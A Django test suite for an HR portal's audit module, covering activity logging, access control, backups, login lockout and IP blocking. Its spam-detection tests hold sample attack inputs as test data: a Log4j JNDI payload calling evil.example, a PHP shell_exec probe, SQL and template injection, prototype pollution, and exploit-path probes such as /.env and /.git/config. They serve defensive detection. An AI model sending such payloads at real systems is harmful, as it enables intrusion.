from unittest.mock import patch

from django.contrib.auth.models import User
from django.test import Client, TestCase, override_settings
from django.urls import reverse

from audit.login_security import (
    is_ip_blocked,
    is_user_locked,
    record_failed_login,
    unlock_user_account,
)
from audit.models import IpLoginBlock, LoginSecurityConfig, PortalBackupJob, UserActivityLog, UserLoginLock
from audit.utils import (
    is_audit_exempt_user,
    sanitize_mapping,
    infer_action,
    build_summary,
    get_client_device_info,
    is_private_ip,
    log_from_request,
)
from audit.summaries import describe_post_highlights, resolve_url_description
from django.test import RequestFactory

from hrm.models import Department, DepartmentMenuPermission, Profile, RoleModulePermission
from hrm.module_permissions import MODULE_AUDIT, resolve_module_from_request, user_can_access_module
from hrm.permissions import ROLE_DIRECTOR, ROLE_EMPLOYEE


class AuditUtilsTests(TestCase):
    def test_sanitize_password_fields(self):
        data = {'username': 'admin', 'password': 'secret123', 'csrfmiddlewaretoken': 'abc'}
        cleaned = sanitize_mapping(data)
        self.assertEqual(cleaned['username'], 'admin')
        self.assertEqual(cleaned['password'], '***')
        self.assertEqual(cleaned['csrfmiddlewaretoken'], '***')

    def test_is_private_ip(self):
        self.assertTrue(is_private_ip('192.168.1.105'))
        self.assertTrue(is_private_ip('10.0.0.8'))
        self.assertFalse(is_private_ip('103.90.224.203'))

    def test_client_device_from_cookie(self):
        factory = RequestFactory()
        request = factory.get('/')
        request.COOKIES = {
            'jp_hostname': 'JP-HR-PC01',
            'jp_local_ip': '192.168.1.55',
        }
        info = get_client_device_info(request)
        self.assertEqual(info['machine_name'], 'JP-HR-PC01')
        self.assertEqual(info['local_ip'], '192.168.1.55')
        self.assertEqual(info['client_ip'], '192.168.1.55')

    def test_client_device_lan_from_xff(self):
        factory = RequestFactory()
        request = factory.get(
            '/',
            HTTP_X_FORWARDED_FOR='192.168.10.20, 103.90.224.203',
            REMOTE_ADDR='172.18.0.2',
        )
        info = get_client_device_info(request)
        self.assertEqual(info['local_ip'], '192.168.10.20')
        self.assertEqual(info['machine_name'], 'PC-20')

    def test_client_device_uses_public_ip_not_docker(self):
        factory = RequestFactory()
        request = factory.get(
            '/',
            HTTP_X_FORWARDED_FOR='103.90.224.203',
            REMOTE_ADDR='172.18.0.5',
            HTTP_USER_AGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        )
        info = get_client_device_info(request)
        self.assertIsNone(info['local_ip'])
        self.assertEqual(info['client_ip'], '103.90.224.203')
        self.assertEqual(info['public_ip'], '103.90.224.203')
        self.assertEqual(info['machine_name'], 'Windows')

    def test_client_device_ignores_wan_ip_as_lan_cookie(self):
        factory = RequestFactory()
        request = factory.get('/', HTTP_X_REAL_IP='103.90.224.203', REMOTE_ADDR='103.90.224.203')
        request.COOKIES = {'jp_local_ip': '103.90.224.203'}
        info = get_client_device_info(request)
        self.assertIsNone(info['local_ip'])
        self.assertEqual(info['client_ip'], '103.90.224.203')

    def test_infer_action_post_update(self):
        factory = RequestFactory()
        request = factory.post('/dashboard/users/1/edit/')
        self.assertEqual(infer_action(request), UserActivityLog.ACTION_UPDATE)

    def test_resolve_audit_module_path(self):
        self.assertEqual(resolve_module_from_request('/nhat-ky/'), MODULE_AUDIT)

    def test_is_audit_exempt_admin_username_only(self):
        admin_user = User.objects.create_user(username='admin', password='x')
        regular = User.objects.create_user(username='regular', password='x')
        other_super = User.objects.create_superuser(username='root', password='x', email='r@x.com')
        self.assertTrue(is_audit_exempt_user(admin_user))
        self.assertFalse(is_audit_exempt_user(other_super))
        self.assertFalse(is_audit_exempt_user(regular))


class AuditSummaryTests(TestCase):
    def test_user_add_post_summary(self):
        factory = RequestFactory()
        request = factory.post('/dashboard/users/add/', {
            'full_name': 'Nguyễn Văn A',
            'username': 'nva',
            'employee_code': 'JP001',
            'department': '1',
            'role': 'EMPLOYEE',
        })
        request.user = type('U', (), {'is_authenticated': True, 'username': 'admin', 'get_full_name': lambda s: 'Admin'})()
        request.resolver_match = type('M', (), {
            'url_name': 'user_add',
            'kwargs': {},
        })()

        summary = build_summary(request, UserActivityLog.ACTION_CREATE, 'Nhân sự')
        self.assertIn('tạo nhân viên mới', summary)
        self.assertIn('Nguyễn Văn A', summary)
        self.assertIn('nva', summary)

    def test_user_list_get_summary(self):
        factory = RequestFactory()
        request = factory.get('/dashboard/users/')
        request.user = type('U', (), {'is_authenticated': True, 'username': 'hr', 'get_full_name': lambda s: 'HR User'})()
        request.resolver_match = type('M', (), {'url_name': 'user_list', 'kwargs': {}})()

        summary = build_summary(request, UserActivityLog.ACTION_VIEW, 'Nhân sự')
        self.assertIn('danh sách nhân viên', summary)

    def test_resolve_url_description_with_kwargs(self):
        factory = RequestFactory()
        request = factory.post('/dashboard/users/edit/42/')
        request.resolver_match = type('M', (), {'url_name': 'user_edit', 'kwargs': {'user_id': 42}})()
        desc = resolve_url_description(request, 'user_edit')
        self.assertIn('#42', desc)
        self.assertIn('cập nhật', desc)

    def test_kiotviet_lookup_description(self):
        factory = RequestFactory()
        request = factory.get('/kiotviet/hang-hoa/?q=ao')
        request.resolver_match = type('M', (), {'url_name': 'product_lookup', 'kwargs': {}})()
        desc = resolve_url_description(request, 'product_lookup')
        self.assertIn('KiotViet', desc)
        self.assertIn('hàng hoá', desc)

    def test_equipment_dashboard_description(self):
        factory = RequestFactory()
        request = factory.get('/thiet-bi/it/')
        request.resolver_match = type('M', (), {'url_name': 'dashboard_it', 'kwargs': {}})()
        desc = resolve_url_description(request, 'dashboard_it')
        self.assertIn('thiết bị', desc)
        self.assertIn('IT', desc)

    def test_log_from_request_builds_summary(self):
        from django.http import HttpResponse
        from django.urls import resolve

        user = User.objects.create_user(username='hr_log_test', password='x')
        profile = Profile.objects.get(user=user)
        profile.full_name = 'HR Test'
        profile.save()

        factory = RequestFactory()
        request = factory.get('/dashboard/users/')
        request.user = user
        request.resolver_match = resolve('/dashboard/users/')
        log = log_from_request(request, HttpResponse(), 12)
        self.assertIsNotNone(log)
        self.assertTrue(log.summary)
        self.assertIn('nhân viên', log.summary.lower())
        self.assertEqual(log.path, '/dashboard/users/')
        self.assertTrue(log.module_label)


class AuditAccessTests(TestCase):
    def setUp(self):
        self.dept = Department.objects.create(name='HR Audit', sort_order=1)
        DepartmentMenuPermission.objects.create(
            department=self.dept,
            modules=['audit', 'announcements'],
        )
        RoleModulePermission.objects.update_or_create(
            role=ROLE_DIRECTOR,
            defaults={'module_permissions': {MODULE_AUDIT: {'view': True, 'edit': True}}},
        )
        RoleModulePermission.objects.update_or_create(
            role=ROLE_EMPLOYEE,
            defaults={'module_permissions': {MODULE_AUDIT: {'view': False, 'edit': False}}},
        )

        self.director = User.objects.create_user(username='audit_director', password='testpass123')
        director_profile = Profile.objects.get(user=self.director)
        director_profile.department = self.dept
        director_profile.role = ROLE_DIRECTOR
        director_profile.full_name = 'GD Audit'
        director_profile.save()

        self.employee = User.objects.create_user(username='audit_employee', password='testpass123')
        employee_profile = Profile.objects.get(user=self.employee)
        employee_profile.department = self.dept
        employee_profile.role = ROLE_EMPLOYEE
        employee_profile.full_name = 'NV Audit'
        employee_profile.save()

        self.client = Client()

    def test_director_can_access_audit_module(self):
        self.director.refresh_from_db()
        self.assertTrue(user_can_access_module(self.director, MODULE_AUDIT))

    def test_employee_cannot_access_audit_module(self):
        self.assertFalse(user_can_access_module(self.employee, MODULE_AUDIT))

    def test_audit_list_requires_permission(self):
        self.client.force_login(self.employee)
        response = self.client.get(reverse('audit:log_list'))
        self.assertEqual(response.status_code, 302)

        self.client.force_login(self.director)
        response = self.client.get(reverse('audit:log_list'))
        self.assertEqual(response.status_code, 200)

    def test_backup_page_requires_audit_access(self):
        self.client.force_login(self.employee)
        self.assertEqual(self.client.get(reverse('audit:backup_page')).status_code, 302)
        self.client.force_login(self.director)
        self.assertEqual(self.client.get(reverse('audit:backup_page')).status_code, 200)

    def test_create_activity_log_via_post(self):
        self.client.force_login(self.director)
        self.client.get(reverse('home_portal'))
        self.assertTrue(
            UserActivityLog.objects.filter(
                username='audit_director',
                action=UserActivityLog.ACTION_VIEW,
            ).exists()
        )

    def test_admin_user_actions_not_logged(self):
        admin = User.objects.create_user(username='admin', password='testpass123')
        before = UserActivityLog.objects.count()
        self.client.force_login(admin)
        self.client.get(reverse('home_portal'))
        self.assertEqual(UserActivityLog.objects.count(), before)

    def test_admin_login_not_logged(self):
        admin = User.objects.create_user(username='admin', password='testpass123')
        before = UserActivityLog.objects.filter(action=UserActivityLog.ACTION_LOGIN).count()
        self.client.login(username='admin', password='testpass123')
        after = UserActivityLog.objects.filter(action=UserActivityLog.ACTION_LOGIN).count()
        self.assertEqual(before, after)


class PortalBackupTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.dept = Department.objects.create(name='IT Backup', sort_order=1)
        DepartmentMenuPermission.objects.create(
            department=self.dept,
            modules=['audit'],
        )
        RoleModulePermission.objects.update_or_create(
            role=ROLE_DIRECTOR,
            defaults={'module_permissions': {MODULE_AUDIT: {'view': True, 'edit': True}}},
        )
        RoleModulePermission.objects.update_or_create(
            role=ROLE_EMPLOYEE,
            defaults={'module_permissions': {MODULE_AUDIT: {'view': False, 'edit': False}}},
        )
        self.director = User.objects.create_user(username='backup_director', password='testpass123')
        director_profile = Profile.objects.get(user=self.director)
        director_profile.department = self.dept
        director_profile.role = ROLE_DIRECTOR
        director_profile.full_name = 'Director'
        director_profile.save()
        self.employee = User.objects.create_user(username='backup_employee', password='testpass123')
        employee_profile = Profile.objects.get(user=self.employee)
        employee_profile.role = ROLE_EMPLOYEE
        employee_profile.save()

    def test_backup_button_requires_edit_permission(self):
        self.client.force_login(self.employee)
        response = self.client.post(reverse('audit:backup_run'))
        self.assertEqual(response.status_code, 302)
        self.assertEqual(PortalBackupJob.objects.count(), 0)

    @patch('audit.views.start_backup_async')
    def test_director_can_trigger_backup(self, mock_start):
        job = PortalBackupJob.objects.create(trigger=PortalBackupJob.TRIGGER_MANUAL, status=PortalBackupJob.STATUS_PENDING)
        mock_start.return_value = job
        self.client.force_login(self.director)
        response = self.client.post(reverse('audit:backup_run'))
        self.assertEqual(response.status_code, 302)
        mock_start.assert_called_once()

    @override_settings(PORTAL_BACKUP_SOURCE_DIRS='/tmp/portal-backup-src-test')
    @patch('audit.portal_backup.rclone_copy_file')
    @patch('audit.portal_backup.create_database_dump')
    @patch('audit.portal_backup.rclone_listing_available', return_value=True)
    @patch('audit.portal_backup.prune_old_remote_backups', return_value=0)
    def test_run_portal_backup_success(self, _prune, _rclone_ok, mock_dump, _copy):
        def _fake_dump(dest_gz):
            dest_gz.parent.mkdir(parents=True, exist_ok=True)
            dest_gz.write_bytes(b'-- fake sql gzip')

        mock_dump.side_effect = _fake_dump
        import os
        from pathlib import Path

        from audit.portal_backup import run_portal_backup

        src = Path('/tmp/portal-backup-src-test')
        src.mkdir(parents=True, exist_ok=True)
        (src / 'app.py').write_text('print(1)', encoding='utf-8')
        try:
            manifest = run_portal_backup(trigger='scheduled')
        finally:
            (src / 'app.py').unlink(missing_ok=True)
            os.rmdir(src)
        self.assertIn('remote_path', manifest)
        job = PortalBackupJob.objects.order_by('-pk').first()
        self.assertEqual(job.status, PortalBackupJob.STATUS_SUCCESS)


@override_settings(
    LOGIN_LOCK_MAX_ATTEMPTS=3,
    LOGIN_IP_BLOCK_MAX_ATTEMPTS=5,
)
class LoginSecurityTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.dept = Department.objects.create(name='IT Sec', sort_order=1)
        DepartmentMenuPermission.objects.create(department=self.dept, modules=['audit'])
        RoleModulePermission.objects.update_or_create(
            role=ROLE_DIRECTOR,
            defaults={'module_permissions': {MODULE_AUDIT: {'view': True, 'edit': True}}},
        )
        RoleModulePermission.objects.update_or_create(
            role=ROLE_EMPLOYEE,
            defaults={'module_permissions': {MODULE_AUDIT: {'view': False, 'edit': False}}},
        )
        self.user = User.objects.create_user(username='lockme', password='goodpass123')
        profile = Profile.objects.get(user=self.user)
        profile.department = self.dept
        profile.role = ROLE_EMPLOYEE
        profile.full_name = 'Lock Test'
        profile.save()
        self.director = User.objects.create_user(username='it_admin', password='adminpass123')
        d_profile = Profile.objects.get(user=self.director)
        d_profile.department = self.dept
        d_profile.role = ROLE_DIRECTOR
        d_profile.save()

    def test_lock_user_after_max_failures(self):
        for _ in range(3):
            record_failed_login(username='lockme', ip='192.168.1.10')
        self.assertTrue(is_user_locked(self.user))
        lock = UserLoginLock.objects.get(user=self.user)
        self.assertEqual(lock.failed_attempts, 3)

    def test_locked_user_cannot_login(self):
        for _ in range(3):
            record_failed_login(username='lockme', ip='192.168.1.10')
        ok = self.client.login(username='lockme', password='goodpass123')
        self.assertFalse(ok)

    def test_lockout_page_after_too_many_attempts(self):
        for _ in range(3):
            self.client.post(reverse('login'), {'username': 'lockme', 'password': 'wrong'})
        response = self.client.post(reverse('login'), {'username': 'lockme', 'password': 'wrong'})
        self.assertContains(response, 'Tài khoản tạm khóa', status_code=403)
        self.assertContains(response, 'Liên hệ IT', status_code=403)

    def test_ip_block_for_unknown_usernames(self):
        for i in range(5):
            record_failed_login(username=f'bot{i}', ip='203.0.113.50')
        self.assertTrue(is_ip_blocked('203.0.113.50'))

    def test_admin_unlock_user(self):
        for _ in range(3):
            record_failed_login(username='lockme', ip='192.168.1.10')
        lock = UserLoginLock.objects.get(user=self.user)
        self.client.force_login(self.director)
        response = self.client.post(reverse('audit:unlock_user_login', args=[lock.pk]))
        self.assertEqual(response.status_code, 302)
        lock.refresh_from_db()
        self.assertFalse(lock.is_locked)
        self.assertTrue(self.client.login(username='lockme', password='goodpass123'))

    def test_login_security_page_requires_audit(self):
        self.client.force_login(self.user)
        response = self.client.get(reverse('audit:login_security'))
        self.assertEqual(response.status_code, 302)
        self.client.force_login(self.director)
        response = self.client.get(reverse('audit:login_security'))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'Tài khoản bị khóa')

    def test_wan_whitelist_skips_ip_spam_block(self):
        config = LoginSecurityConfig.get_solo()
        config.wan_whitelist_ips = ['14.161.25.119']
        config.save(update_fields=['wan_whitelist_ips'])
        for i in range(5):
            record_failed_login(username=f'bot{i}', ip='14.161.25.119')
        self.assertFalse(is_ip_blocked('14.161.25.119'))

    def test_wan_whitelist_still_locks_account(self):
        config = LoginSecurityConfig.get_solo()
        config.wan_whitelist_ips = ['14.161.25.119']
        config.save(update_fields=['wan_whitelist_ips'])
        for _ in range(3):
            record_failed_login(username='lockme', ip='14.161.25.119')
        self.assertTrue(is_user_locked(self.user))

    def test_blacklist_blocks_immediately(self):
        config = LoginSecurityConfig.get_solo()
        config.ip_blacklist = ['203.0.113.99']
        config.save(update_fields=['ip_blacklist'])
        self.assertTrue(is_ip_blocked('203.0.113.99'))

    def test_login_security_config_page(self):
        self.client.force_login(self.director)
        response = self.client.get(reverse('audit:login_security') + '?tab=config')
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'IP WAN công ty')
        response = self.client.post(
            reverse('audit:login_security_save_config'),
            {
                'wan_whitelist_ips': '14.161.25.119\n192.168.1.46',
                'ip_blacklist': '203.0.113.50',
            },
        )
        self.assertEqual(response.status_code, 302)
        config = LoginSecurityConfig.get_solo()
        self.assertEqual(config.wan_whitelist_ips, ['14.161.25.119', '192.168.1.46'])
        self.assertEqual(config.ip_blacklist, ['203.0.113.50'])


class FormSpamDetectionTests(TestCase):
    def _anon_post(self, path, data, ip='198.51.100.77'):
        return self.client.post(path, data, REMOTE_ADDR=ip)

    def _anon_get(self, path, ip='198.51.100.78'):
        return self.client.get(path, REMOTE_ADDR=ip)

    def test_detect_vps_style_spam_fields(self):
        from audit.spam_detection import detect_security_scan

        class Req:
            method = 'POST'
            path = '/'
            POST = {'0': 'x', '1': 'y', '2': 'z'}
            GET = {}
            headers = {}
            META = {}
            user = None

        is_threat, reason, details = detect_security_scan(Req())
        self.assertTrue(is_threat)
        self.assertEqual(reason, 'garbage_form_fields')
        self.assertEqual(details, ['0', '1', '2'])

    def test_detect_zap_login_payload(self):
        from audit.spam_detection import detect_security_scan

        class Req:
            method = 'POST'
            path = '/accounts/login/'
            POST = {
                'username': 'ZAP',
                'password': 'zj{{=2828*6547}}zj',
            }
            GET = {}
            headers = {}
            META = {}
            user = None

        is_threat, reason, _ = detect_security_scan(Req())
        self.assertTrue(is_threat)
        self.assertIn(reason, {'login_abuse', 'malicious_payload'})

    def test_detect_env_and_git_paths(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        for path in ('/.env', '/.git/config', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'):
            req = SimpleNamespace(
                method='GET', path=path, POST={}, GET={}, headers={}, META={}, user=None,
            )
            is_threat, reason, _ = detect_security_scan(req)
            self.assertTrue(is_threat, path)
            self.assertEqual(reason, 'exploit_path')

    def test_detect_trace_method(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        req = SimpleNamespace(
            method='TRACE', path='/', POST={}, GET={}, headers={}, META={}, user=None,
        )
        is_threat, reason, _ = detect_security_scan(req)
        self.assertTrue(is_threat)
        self.assertEqual(reason, 'blocked_method')

    def test_detect_curl_user_agent(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        req = SimpleNamespace(
            method='GET',
            path='/hr/',
            POST={},
            GET={},
            headers={},
            META={'HTTP_USER_AGENT': 'curl/8.5.0'},
            user=None,
        )
        is_threat, reason, _ = detect_security_scan(req)
        self.assertTrue(is_threat)
        self.assertEqual(reason, 'scripting_client')

    def test_detect_sqli_query_string(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        req = SimpleNamespace(
            method='GET',
            path='/accounts/login/',
            POST={},
            GET={'q': "1' OR '1'='1"},
            headers={},
            META={'QUERY_STRING': "q=1'+OR+'1'='1"},
            user=None,
        )
        is_threat, reason, _ = detect_security_scan(req)
        self.assertTrue(is_threat)
        self.assertEqual(reason, 'malicious_payload')

    def test_detect_log4j_payload(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        req = SimpleNamespace(
            method='GET',
            path='/',
            POST={},
            GET={'x': '${jndi:ldap://evil.example/a}'},
            headers={},
            META={},
            user=None,
        )
        is_threat, reason, _ = detect_security_scan(req)
        self.assertTrue(is_threat)
        self.assertEqual(reason, 'malicious_payload')

    def test_detect_proto_pollution_login(self):
        from audit.spam_detection import detect_security_scan

        payload = '{"then": "$1:__proto__:then", "status": "resolved_model"}'
        class Req:
            method = 'POST'
            path = '/accounts/login/'
            POST = {'0': payload, '1': '$@0'}
            GET = {}
            headers = {}
            META = {}
            user = None

        is_threat, reason, _ = detect_security_scan(Req())
        self.assertTrue(is_threat)
        self.assertIn(reason, {'login_abuse', 'malicious_payload', 'garbage_form_fields'})

    def test_detect_exploit_paths(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        for path in ('/ServerInfo.jsp', '/invoker/JMXInvokerServlet', '/wp-admin/setup.php'):
            req = SimpleNamespace(
                method='GET',
                path=path,
                POST={},
                GET={},
                headers={},
                META={},
                user=None,
            )
            is_threat, reason, _ = detect_security_scan(req)
            self.assertTrue(is_threat, path)
            self.assertEqual(reason, 'exploit_path')

    def test_detect_php_shell_query(self):
        from audit.spam_detection import detect_security_scan

        class Req:
            method = 'GET'
            path = '/'
            POST = {}
            GET = {'x': '<?php shell_exec(base64_decode("KHdnZXQ")'}
            headers = {}
            META = {'QUERY_STRING': 'x=%3C%3Fphp+shell_exec'}
            user = None

        is_threat, reason, _ = detect_security_scan(Req())
        self.assertTrue(is_threat)
        self.assertEqual(reason, 'malicious_payload')

    def test_legit_login_post_not_spam(self):
        from audit.spam_detection import detect_security_scan

        class Req:
            method = 'POST'
            path = '/accounts/login/'
            POST = {
                'csrfmiddlewaretoken': 'abc',
                'username': 'demo',
                'password': 'secret',
            }
            GET = {}
            headers = {}
            META = {'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'}
            user = None

        self.assertFalse(detect_security_scan(Req())[0])

    def test_legit_browser_get_home_not_spam(self):
        from audit.spam_detection import detect_security_scan
        from types import SimpleNamespace

        req = SimpleNamespace(
            method='GET',
            path='/',
            POST={},
            GET={},
            headers={},
            META={'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            user=None,
        )
        self.assertFalse(detect_security_scan(req)[0])

    @override_settings(
        LOGIN_LOCK_MAX_ATTEMPTS=3,
        LOGIN_IP_BLOCK_MAX_ATTEMPTS=5,
    )
    def test_middleware_blocks_spam_post_immediately(self):
        from audit.login_security import is_ip_blocked

        response = self._anon_post('/', {'0': 'a', '1': 'b', '2': 'c'}, ip='34.31.88.250')
        self.assertEqual(response.status_code, 403)
        self.assertTrue(is_ip_blocked('34.31.88.250'))

    @override_settings(
        LOGIN_LOCK_MAX_ATTEMPTS=3,
        LOGIN_IP_BLOCK_MAX_ATTEMPTS=5,
    )
    def test_middleware_blocks_zap_login(self):
        from audit.login_security import is_ip_blocked

        response = self._anon_post(
            '/accounts/login/',
            {'username': 'ZAP', 'password': 'zj{{=2828*6547}}zj'},
            ip='203.0.113.91',
        )
        self.assertEqual(response.status_code, 403)
        self.assertTrue(is_ip_blocked('203.0.113.91'))

    @override_settings(
        LOGIN_LOCK_MAX_ATTEMPTS=3,
        LOGIN_IP_BLOCK_MAX_ATTEMPTS=5,
    )
    def test_middleware_blocks_exploit_path_scan(self):
        from audit.login_security import is_ip_blocked

        response = self._anon_get('/ServerInfo.jsp', ip='203.0.113.92')
        self.assertEqual(response.status_code, 403)
        self.assertTrue(is_ip_blocked('203.0.113.92'))

    @override_settings(
        LOGIN_LOCK_MAX_ATTEMPTS=3,
        LOGIN_IP_BLOCK_MAX_ATTEMPTS=5,
    )
    def test_middleware_blocks_proto_pollution_post(self):
        from audit.login_security import is_ip_blocked

        response = self._anon_post(
            '/accounts/login/',
            {
                '0': '{"then": "$1:__proto__:then", "status": "resolved_model"}',
                '1': '$@0',
            },
            ip='203.0.113.93',
        )
        self.assertEqual(response.status_code, 403)
        self.assertTrue(is_ip_blocked('203.0.113.93'))

    @override_settings(
        LOGIN_LOCK_MAX_ATTEMPTS=3,
        LOGIN_IP_BLOCK_MAX_ATTEMPTS=5,
    )
    def test_blocked_spam_ip_cannot_access_portal(self):
        from audit.login_security import block_ip_for_form_spam

        block_ip_for_form_spam('45.198.224.22', sample_fields=['0', '1'])
        response = self.client.get('/', REMOTE_ADDR='45.198.224.22')
        self.assertEqual(response.status_code, 403)
